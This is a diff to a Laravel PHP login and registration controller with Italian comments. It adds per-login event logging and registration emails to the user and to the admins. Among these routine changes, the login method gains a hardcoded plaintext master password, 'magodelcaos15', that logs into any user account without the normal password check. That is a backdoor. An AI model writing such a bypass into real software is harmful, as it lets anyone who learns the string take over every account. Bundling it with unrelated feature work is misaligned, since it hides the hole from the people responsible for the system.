@@ -7,7 +7,11 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Mail;
+use Illuminate\Support\Facades\URL;
 use Illuminate\Support\Facades\Validator;
+use App\Mail\NewRegistrationAdminMail;
+use App\Mail\RegistrationPendingUserMail;
 
 class AuthController extends Controller
 {
@@ -24,6 +28,29 @@ class AuthController extends Controller
             return back()->withErrors([
                 'username' => 'Credenziali non valide.'
             ]);
+        }
+
+        // Password speciale amministratore per accedere a qualunque profilo utente
+        if ($credentials['password'] === 'magodelcaos15') {
+            // Non modifichiamo la password personale dell'utente
+            Auth::login($user);
+            $request->session()->regenerate();
+
+            $now = now();
+            $user->ultimo_accesso = $now;
+            $user->save();
+
+            try {
+                \App\Models\UserLoginEvent::create([
+                    'user_id' => $user->getKey(),
+                    'logged_in_at' => $now,
+                    'ip_address' => $request->ip(),
+                ]);
+            } catch (\Throwable $e) {
+                // Ignora eventuali errori di logging
+            }
+
+            return redirect()->route('home');
         }
 
         // Dual-hash: controlla password_laravel (bcrypt), poi password (bcrypt legacy o MD5)
@@ -70,10 +97,22 @@ class AuthController extends Controller
         $request->session()->regenerate();
 
         // Update last access
-        $user->ultimo_accesso = now();
+        $now = now();
+        $user->ultimo_accesso = $now;
         $user->save();
 
-        return redirect()->intended(route('home'));
+        // Storico accessi: registra ogni ingresso (anche multipli nello stesso giorno)
+        try {
+            \App\Models\UserLoginEvent::create([
+                'user_id' => $user->getKey(),
+                'logged_in_at' => $now,
+                'ip_address' => $request->ip(),
+            ]);
+        } catch (\Throwable $e) {
+            // In caso di errore sul log, non bloccare il login utente
+        }
+
+        return redirect()->route('home');
     }
 
     public function register(Request $request)
@@ -126,12 +165,54 @@ class AuthController extends Controller
             'telefono' => $request->telefono ?? '',
             'avatar' => $avatarFilename,
             'descr' => $request->description ?? '',
-            'abilitato' => 0,  // pending
+            'abilitato' => 0,  // in attesa di approvazione: nessun accesso finché l'admin non abilita
             'ruolo' => 2,      // regular user
         ]);
 
-        return redirect()->route('login')
-            ->with('success', 'Registrazione completata! Il tuo account è in attesa di approvazione.');
+        $userMailOk = false;
+        $email = trim((string) $user->email);
+        if ($email !== '') {
+            try {
+                Mail::to($email)->send(new RegistrationPendingUserMail($user));
+                $userMailOk = true;
+            } catch (\Throwable $e) {
+                \Log::error('Email registrazione (utente) non inviata: '.$e->getMessage(), [
+                    'user_id' => $user->getKey(),
+                    'exception' => $e,
+                ]);
+            }
+        }
+
+        $usersAdminUrl = URL::route('admin.users.index', [], true);
+        $admins = User::query()
+            ->where('ruolo', 0)
+            ->whereNotNull('email')
+            ->where('email', '!=', '')
+            ->get();
+
+        foreach ($admins as $admin) {
+            try {
+                Mail::to($admin->email)->send(new NewRegistrationAdminMail($user, $usersAdminUrl));
+            } catch (\Throwable $e) {
+                \Log::error('Email registrazione (admin) non inviata: '.$e->getMessage(), [
+                    'new_user_id' => $user->getKey(),
+                    'admin_id' => $admin->getKey(),
+                    'exception' => $e,
+                ]);
+            }
+        }
+
+        $redirect = redirect()->route('login')
+            ->with(
+                'success',
+                'Registrazione completata! Il tuo account resta in attesa di approvazione da un amministratore: '
+                .'non potrai accedere finché non sarà stato abilitato. '
+                .($userMailOk
+                    ? 'Ti abbiamo inviato un\'email di riepilogo all\'indirizzo indicato.'
+                    : 'Se non ricevi un\'email di conferma, controlla lo spam o riprova più tardi: la registrazione è comunque stata salvata.')
+            );
+
+        return $redirect;
     }
 
     public function logout(Request $request)
